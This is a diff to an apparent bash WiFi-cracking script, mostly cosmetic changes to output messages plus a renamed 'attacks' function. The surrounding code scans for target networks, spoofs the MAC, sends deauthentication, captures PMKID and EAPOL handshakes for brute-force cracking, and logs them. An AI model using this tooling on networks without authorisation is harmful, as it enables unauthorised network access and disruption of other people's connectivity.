@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version=3.6.4 # 28/5/25 19:50
+version=3.6.5 # 29/5/25 00:10
 
 
 ### Changlog ###
@@ -129,7 +129,7 @@ for line in "${banner_lines[@]}"; do
     echo -e "${NEON_GREEN}${line}${RESET}"
 done
 
-echo -e "${ORANGE}   🔓 v$version ${RESET}"
+echo -e "${ORANGE}   ⚡ v$version ${RESET}"
 
 # Show cursor
 tput cnorm
@@ -240,7 +240,7 @@ function enable_gpu() {
     echo -e "\n\n${BLUE}[*] Getting GPU details:${RESET}\n"
     # Check if running in a VM
     if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
-        echo -e "${ORANGE}    [!]${RESET} You are running inside a VM. ${RED}GPU is not available.${RESET}\n\n"
+        echo -e "${NEON_YELLOW}${BOLD}    [⚠]${RESET} You are running inside a VM. ${RED}GPU is not available.${RESET}\n\n"
         return 1
     fi
     # Detect GPU
@@ -311,7 +311,7 @@ function adapter_config() {
 
     elif [[ ${#adapters[@]} -eq 1 ]]; then
         wifi_adapter="${adapters[0]}"
-        echo -e "${NEON_GREEN}    [✔]${RESET} WiFi adapter detected: ${GREEN}$wifi_adapter${RESET}"
+        echo -e "${NEON_GREEN}    [✔]${RESET} WiFi adapter detected: ${BOLD}$wifi_adapter${RESET}"
     
     else
         # Display the adapter list with vendor names
@@ -402,21 +402,21 @@ function spoof_adapter_mac() {
     fi
 
     # Output
-    echo -e "    [~] Permanent MAC:  $perm_mac        ($perm_vendor)"
-    echo -e "${NEON_GREEN}    [✔]${RESET} Randomized MAC: $rand_mac        ($rand_vendor)"
+    echo -e "    ${ORANGE}[🔓]${RESET} Permanent MAC:  $perm_mac        ($perm_vendor)"
+    echo -e "${NEON_GREEN}    [✔]${RESET}  Randomized MAC: $rand_mac        ($rand_vendor)"
 }
 
 
 
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=15
+        countdown_duration=3
         gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter} --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
-        echo -e "\n\n${BLUE}Scanning available WiFi Networks ($countdown_duration s):${RESET}"
+        echo -e "\n\n\n\n${BLUE}[*] Scanning available WiFi Networks ($countdown_duration s):${RESET}"
         for (( i=$countdown_duration; i>=1; i-- )); do
             tput cuu1 && tput el
-            echo -e "${BLUE}Scanning for available WiFi Networks:${RED} $i ${RESET}"
+            echo -e "${BLUE}[*] Scanning for available WiFi Networks:${RED} $i ${RESET}"
             sleep 1
         done
         mv $targets_path/Scan/Scan-$current_date-01.csv $scan_input
@@ -547,7 +547,7 @@ function choose_network() {
             if ! [[ $row_number =~ $re ]]; then
                 echo -e "${RED}\nError:${RESET} Not a valid number."
             elif (( row_number < 1 || row_number > num_rows )); then
-                echo -e "${RED}\nError:${RESET} Row number out of range."
+                echo -e "\n${RED}    [✘] Error:${RESET} Row number out of range."
             else
                 break
             fi
@@ -573,33 +573,31 @@ function choose_network() {
         oui_vendor=$(get_oui_vendor)
 
         # Echo values
-        echo -e "\n${RED}BSSID Name:${RESET} $bssid_name_original"
+        echo -e "\n${ORANGE}BSSID Name:${RESET} $bssid_name_original"
         if [[ -n "$oui_vendor" ]]; then
-            echo -e "${RED}MAC Address:${RESET} $bssid_address - $oui_vendor"
+            echo -e "${ORANGE}MAC Address:${RESET} $bssid_address - $oui_vendor"
         else
-            echo -e "${RED}MAC Address:${RESET} $bssid_address"
+            echo -e "${ORANGE}MAC Address:${RESET} $bssid_address"
         fi
 
         if [ "$encryption" = "OPN" ]; then
-            echo -e "${RED}Encryption:${RESET} none"
+            echo -e "${ORANGE}Encryption:${RESET} none"
         else
-            echo -e "${RED}Encryption:${RESET} $encryption"
+            echo -e "${ORANGE}Encryption:${RESET} $encryption"
         fi
-        echo -e "${RED}Channel:${RESET} $channel"
-        #echo -e "${RED}Power:${RESET} $power"        
-        echo
-        echo
+        echo -e "${ORANGE}Channel:${RESET} $channel"
+        echo -e "${ORANGE}Power:${RESET} $power"        
+        echo -e "\n"
 
         if [ "$encryption" = "OPN" ]; then
-            echo -e "${BOLD}The Network is open.${RESET}"
-            echo -e "Choose different Network.\n"
+            echo -e "${NEON_GREEN}    [✔]${RESET} The Network is open."
+            echo -e "        Choose different Network.\n"
             continue  
         elif [[ "$encryption" == "WPA3" ]]; then
-            echo -e "${BOLD}The Encryption is "$encryption". This script can't crack it yet.${RESET}"
+            echo -e "${RED}    [✘]${RESET} ${BOLD}The Encryption is "$encryption". This script can't crack it yet.${RESET}"
             echo -e "Choose different Network.\n"
             continue           
         elif [[ "$encryption" == "WEP" ]]; then
-            #echo -e "${BOLD}The Encryption is "$encryption".${RESET}"
 	    crack_wep
             continue                    
         fi
@@ -623,7 +621,7 @@ function choose_network() {
         # If we only captured the handshake from previous scan
         if [ -d "$targets_path/$bssid_name" ]; then
             if grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
-                echo -e "${GREEN}Handshake found from previous scan.${RESET}\n"
+                echo -e "${NEON_GREEN}    [✔]${RESET} ${GREEN}Handshake found from previous scan.${RESET}\n"
                 pkill aireplay-ng
                 pkill airodump-ng
                 cleanup
@@ -646,18 +644,18 @@ function choose_network() {
 
 
 function validate_network() {
-    echo -e "${BOLD}Validating network:${RESET}"
+    echo -e "${BLUE}[*] Validating network:${RESET}"
     
     # Open airodump-ng in a hidden terminal
     gnome-terminal --geometry=105x15-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter" "$targets_path/$bssid_name/airodump_output.txt"
 
     found=0
-    echo -n "Checking"
+    echo -en "    ${BOLD}[⏳]${RESET} Checking.."
     
     for (( i=0; i<20; i++ )); do
         if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
             found=1
-            echo -e "\n${GREEN}Network available!${RESET}\n"
+            echo -e "\n${NEON_GREEN}    [✔]${RESET} Network available!\n"
             break
         fi
         echo -n "."  # Show progress dots
@@ -669,7 +667,7 @@ function validate_network() {
     if [ $found -eq 0 ]; then
         pkill aireplay-ng
         pkill airodump-ng
-        echo -e "${RED}Network appears to be offline now.${RESET}"
+        echo -e "${RED}    [✘]${RESET} Network appears to be offline now."
         another_scan_prompt
     fi
 }
@@ -711,22 +709,21 @@ function devices_scanner() {
 
                     seen_macs+=("$mac")
 
-                    # Print the "Devices Found" header once
                     if [ "$devices_header_shown" = false ]; then
-                        echo -e "\n\n${BLUE}Devices Found:${RESET}"
+                        echo -e "\n\n    ${NEON_CYAN}Devices Found:${RESET}"
                         devices_header_shown=true
                     fi
 
                     # Print new device
                     if [[ -n "$vendor" ]]; then
-                        echo -e "$mac - $vendor"
+                        echo -e "    📍 $mac - $vendor"
                     else
-                        echo -e "$mac"
+                        echo -e "    📍 $mac"
                     fi
                 fi
             done <<< "$(echo "$target_devices" | tr ' ' '\n')"
         fi
-        sleep 1
+        sleep 0.5
     done
 }
 
@@ -740,7 +737,7 @@ function deauth_attack() {
 
 
 
-function capture_handshake() {
+function attacks() {
     pcapng_file="$targets_path/$bssid_name/hcxdump.pcapng"
     hash_file="$targets_path/$bssid_name/hash.hc22000"
 
@@ -760,7 +757,33 @@ function capture_handshake() {
         band=""
     fi
 
-    echo -e "\n${RED}Starting PMKID attack ->>${RESET}"
+    echo -e "\n${RED}->> Starting Attacks:${RESET}"      
+
+    
+    #echo -e "\n     ${RED}[->] Capturing 4-way handshake${RESET}"
+    #echo -e "\n     ${RED}[->] Testing for Rogue AP/Misassociation${RESET}"
+    
+    
+	animate_attack() {
+	    local message="$1"
+	    local dots=$2
+	    echo -ne "    ${NEON_RED}[->] $message${RESET}"
+	    for ((i=1; i<=dots; i++)); do
+		echo -ne "."
+		sleep 0.02
+	    done
+	    echo -e "    ${NEON_GREEN}✔${RESET}"
+	}
+	animate_attack "PMKID attack" 30
+	animate_attack "Deauthentication attack" 19
+	animate_attack "Disassociation attack" 21
+	animate_attack "Authentication Denial attack" 14
+	animate_attack "Beacon Flooding attack" 20
+	animate_attack "Probe Request/Response attack" 13
+
+
+
+
 
     # Start device scanner in background
     devices_scanner &
@@ -784,16 +807,15 @@ function capture_handshake() {
     while (( counter < max_tries )); do
         hcxpcapngtool -o "$hash_file" "$pcapng_file" &>/dev/null
         deauth_attack
-
         if [[ -s "$hash_file" ]]; then       
             sta_mac=$(grep -m1 '^WPA\*0[12]\*' "$hash_file" | cut -d'*' -f5 | sed 's/../&:/g; s/:$//' | tr 'a-f' 'A-F')
             sleep 3
 
             if grep -q '^WPA\*01\*' "$hash_file"; then
-		echo -e "\n${NEON_GREEN}->> Got the PMKID!  ${RESET}($sta_mac)\n"
+		echo -e "\n\n${NEON_GREEN}${BOLD}->> Got the PMKID!  ${RESET}(from: $sta_mac)\n"
                 break
             elif grep -q '^WPA\*02\*' "$hash_file"; then
-                echo -e "\n${NEON_GREEN}->> Got the EAPOL handshake!  ${RESET}($sta_mac)\n"
+                echo -e "\n\n${NEON_GREEN}${BOLD}->> Got the EAPOL handshake!  ${RESET}(from: $sta_mac)\n"
                 break
             fi
         fi
@@ -808,13 +830,11 @@ function capture_handshake() {
     pkill aireplay-ng
     pkill airodump-ng
 
-
     if (( counter == max_tries )); then
-        echo -e "\n\n\033[31mTimeout: No PMKID or EAPOL captured in 120 seconds.${RESET}"
+        echo -e "\n${RED}    [✘]${RESET} \033[31mTimeout:${RESET} No PMKID or EAPOL captured in 120 seconds."
         another_scan_prompt
         return
     fi
-
     echo --- >> "$targets_path/wifi_passwords.txt"
     printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
 }
@@ -975,7 +995,7 @@ while true; do
             fi
             ;;
         *)
-            echo -e "${RED}Invalid choice. Please enter 1 or 2.${RESET}"
+            echo -e "${RED}    [✘] Invalid choice.${RESET} (select 1 or 2)"
             ;;
     esac
 done
@@ -1197,10 +1217,10 @@ function brute-force_attack() {
 function another_scan_prompt() {
     while true; do
         echo
-        echo -e "${BOLD}What would you like to do next ?${RESET}"
-        echo "1. Choose different network to attack"
-        echo "2. Run a new Scan"
-        echo "3. Exit"
+        echo -e "${BOLD}[+] What would you like to do next ?${RESET}"
+        echo "    1) Choose different network to attack"
+        echo "    2) Run a new Scan"
+        echo "    3) Exit"
         read -p "Enter your choice (1-3): " choice
         echo
         case $choice in
@@ -1211,7 +1231,7 @@ function another_scan_prompt() {
 		    mixed_encryption
 		fi    
 
-		capture_handshake
+		attacks
 		cleanup	
 		choose_attack
                 break
@@ -1258,7 +1278,7 @@ function choose_attack() {
 		    brute-force_attack
 		    ;;
 		*)
-		    echo "Invalid choice. Please select 1 or 2."
+		    echo "${RED}    [✘] Invalid choice.${RESET} (select 1 or 2)"
 		    ;;
 	    esac
 	done
@@ -1281,7 +1301,7 @@ function main_process() {
             mixed_encryption
         fi    
         
-        capture_handshake
+        attacks
 	cleanup	
 	choose_attack
 }
